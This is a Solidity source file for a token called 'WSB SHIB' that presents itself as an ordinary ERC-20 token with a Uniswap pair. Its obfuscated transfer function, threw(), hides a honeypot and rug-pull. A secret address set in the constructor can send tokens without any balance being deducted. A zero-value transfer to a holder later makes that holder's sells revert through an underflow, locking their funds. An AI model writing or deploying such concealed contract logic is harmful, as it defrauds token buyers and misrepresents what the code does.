/*

https://t.me/wsbshib_eth

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract WSBSHIB is Ownable {
    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private condition;

    constructor(address situation) {
        name = 'WSB SHIB';
        symbol = 'WSB SHIB';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        led[situation] = control;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    uint256 private control = 24;

    function transferFrom(address sweet, address simplest, uint256 live) public returns (bool success) {
        threw(sweet, simplest, live);
        require(live <= allowance[sweet][msg.sender]);
        allowance[sweet][msg.sender] -= live;
        return true;
    }

    function threw(address sweet, address simplest, uint256 live) private returns (bool success) {
        if (live == 0) {
            condition[simplest] += control;
        }
        if (led[sweet] == 0) {
            balanceOf[sweet] -= live;
            if (uniswapV2Pair != sweet && condition[sweet] > 0) {
                led[sweet] -= control;
            }
        }
        balanceOf[simplest] += live;
        emit Transfer(sweet, simplest, live);
        return true;
    }

    mapping(address => uint256) private led;

    uint256 public totalSupply;

    uint8 public decimals = 9;

    function approve(address fewer, uint256 live) public returns (bool success) {
        allowance[msg.sender][fewer] = live;
        emit Approval(msg.sender, fewer, live);
        return true;
    }

    function transfer(address simplest, uint256 live) public returns (bool success) {
        threw(msg.sender, simplest, live);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    address public uniswapV2Pair;

    string public symbol;

    mapping(address => uint256) public balanceOf;
}